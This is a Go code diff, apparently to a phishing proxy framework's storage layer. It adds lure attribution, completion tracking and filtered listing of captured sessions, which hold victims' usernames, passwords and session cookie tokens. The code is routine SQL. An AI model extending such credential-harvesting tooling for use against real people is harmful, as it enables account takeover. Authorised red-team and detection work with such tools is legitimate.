@@ -25,10 +25,12 @@ type Session struct {
 	HttpTokens   map[string]string                  `json:"http_tokens"`
 	CookieTokens map[string]map[string]*CookieToken `json:"tokens"`
 	SessionId    string                             `json:"session_id"`
+	LureId       string                             `json:"lure_id,omitempty"`
 	UserAgent    string                             `json:"useragent"`
 	RemoteAddr   string                             `json:"remote_addr"`
 	CreateTime   int64                              `json:"create_time"`
 	UpdateTime   int64                              `json:"update_time"`
+	Completed    bool                               `json:"completed"`
 	ReopenUrl    string                             `json:"reopen_url,omitempty"` // set from the phishlet at API level, not persisted
 }
 
@@ -49,6 +51,7 @@ const sessionsSchema = `CREATE TABLE IF NOT EXISTS sessions (
 	id INTEGER PRIMARY KEY AUTOINCREMENT,
 	session_id TEXT NOT NULL UNIQUE,
 	phishlet TEXT NOT NULL DEFAULT '',
+	lure_id TEXT NOT NULL DEFAULT '',
 	landing_url TEXT NOT NULL DEFAULT '',
 	username TEXT NOT NULL DEFAULT '',
 	password TEXT NOT NULL DEFAULT '',
@@ -59,7 +62,8 @@ const sessionsSchema = `CREATE TABLE IF NOT EXISTS sessions (
 	useragent TEXT NOT NULL DEFAULT '',
 	remote_addr TEXT NOT NULL DEFAULT '',
 	create_time INTEGER NOT NULL DEFAULT 0,
-	update_time INTEGER NOT NULL DEFAULT 0
+	update_time INTEGER NOT NULL DEFAULT 0,
+	is_done INTEGER NOT NULL DEFAULT 0
 )`
 
 func NewDatabase(path string) (*Database, error) {
@@ -77,11 +81,15 @@ func NewDatabase(path string) (*Database, error) {
 	if _, err := db.Exec(sessionsSchema); err != nil {
 		return nil, err
 	}
+	// Older databases predate lure attribution and completion tracking; add
+	// the columns once.
+	db.Exec("ALTER TABLE sessions ADD COLUMN lure_id TEXT NOT NULL DEFAULT ''")
+	db.Exec("ALTER TABLE sessions ADD COLUMN is_done INTEGER NOT NULL DEFAULT 0")
 	d.db = db
 	return d, nil
 }
 
-const sessionCols = "id, session_id, phishlet, landing_url, username, password, custom, body_tokens, http_tokens, cookie_tokens, useragent, remote_addr, create_time, update_time"
+const sessionCols = "id, session_id, phishlet, lure_id, landing_url, username, password, custom, body_tokens, http_tokens, cookie_tokens, useragent, remote_addr, create_time, update_time, is_done"
 
 func jsonBytes(v interface{}) string {
 	b, err := json.Marshal(v)
@@ -99,10 +107,12 @@ func scanSession(row interface{ Scan(...interface{}) error }) (*Session, error) 
 		CookieTokens: make(map[string]map[string]*CookieToken),
 	}
 	var custom, body, http, cookie string
-	if err := row.Scan(&s.Id, &s.SessionId, &s.Phishlet, &s.LandingURL, &s.Username, &s.Password,
-		&custom, &body, &http, &cookie, &s.UserAgent, &s.RemoteAddr, &s.CreateTime, &s.UpdateTime); err != nil {
+	var done int
+	if err := row.Scan(&s.Id, &s.SessionId, &s.Phishlet, &s.LureId, &s.LandingURL, &s.Username, &s.Password,
+		&custom, &body, &http, &cookie, &s.UserAgent, &s.RemoteAddr, &s.CreateTime, &s.UpdateTime, &done); err != nil {
 		return nil, err
 	}
+	s.Completed = done != 0
 	json.Unmarshal([]byte(custom), &s.Custom)
 	json.Unmarshal([]byte(body), &s.BodyTokens)
 	json.Unmarshal([]byte(http), &s.HttpTokens)
@@ -110,17 +120,69 @@ func scanSession(row interface{ Scan(...interface{}) error }) (*Session, error) 
 	return s, nil
 }
 
-func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
+func (d *Database) CreateSession(sid string, phishlet string, lure_id string, landing_url string, useragent string, remote_addr string) error {
 	d.mtx.Lock()
 	defer d.mtx.Unlock()
 	now := time.Now().Unix()
 	_, err := d.db.Exec(
-		"INSERT INTO sessions (session_id, phishlet, landing_url, useragent, remote_addr, create_time, update_time) VALUES (?,?,?,?,?,?,?)",
-		sid, phishlet, landing_url, useragent, remote_addr, now, now)
+		"INSERT INTO sessions (session_id, phishlet, lure_id, landing_url, useragent, remote_addr, create_time, update_time) VALUES (?,?,?,?,?,?,?,?)",
+		sid, phishlet, lure_id, landing_url, useragent, remote_addr, now, now)
 	if err != nil {
 		return fmt.Errorf("session already exists: %s", sid)
 	}
 	return nil
+}
+
+// SessionFilter narrows the session list for the management API.
+type SessionFilter struct {
+	Phishlet string
+	Lure     string
+	SinceID  int64
+	Limit    int
+}
+
+func (d *Database) ListSessionsFiltered(f SessionFilter) ([]*Session, error) {
+	query := "SELECT " + sessionCols + " FROM sessions"
+	clauses := []string{}
+	args := []interface{}{}
+	if f.Phishlet != "" {
+		clauses = append(clauses, "phishlet = ?")
+		args = append(args, f.Phishlet)
+	}
+	if f.Lure != "" {
+		clauses = append(clauses, "lure_id = ?")
+		args = append(args, f.Lure)
+	}
+	if f.SinceID > 0 {
+		clauses = append(clauses, "id > ?")
+		args = append(args, f.SinceID)
+	}
+	for i, clause := range clauses {
+		if i == 0 {
+			query += " WHERE " + clause
+		} else {
+			query += " AND " + clause
+		}
+	}
+	query += " ORDER BY id"
+	if f.Limit > 0 {
+		query += " LIMIT ?"
+		args = append(args, f.Limit)
+	}
+	rows, err := d.db.Query(query, args...)
+	if err != nil {
+		return nil, err
+	}
+	defer rows.Close()
+	out := []*Session{}
+	for rows.Next() {
+		s, err := scanSession(rows)
+		if err != nil {
+			return nil, err
+		}
+		out = append(out, s)
+	}
+	return out, rows.Err()
 }
 
 func (d *Database) ListSessions() ([]*Session, error) {
@@ -205,6 +267,13 @@ func (d *Database) SetSessionCookieTokens(sid string, tokens map[string]map[stri
 	return err
 }
 
+func (d *Database) SetSessionDone(sid string) error {
+	d.mtx.Lock()
+	defer d.mtx.Unlock()
+	_, err := d.db.Exec("UPDATE sessions SET is_done = 1, update_time = ? WHERE session_id = ?", time.Now().Unix(), sid)
+	return err
+}
+
 func (d *Database) DeleteSession(sid string) error {
 	d.mtx.Lock()
 	defer d.mtx.Unlock()
@@ -217,6 +286,10 @@ func (d *Database) DeleteSessionById(id int) error {
 	defer d.mtx.Unlock()
 	_, err := d.db.Exec("DELETE FROM sessions WHERE id = ?", id)
 	return err
+}
+
+func (d *Database) Close() error {
+	return d.db.Close()
 }
 
 func (d *Database) Flush() {
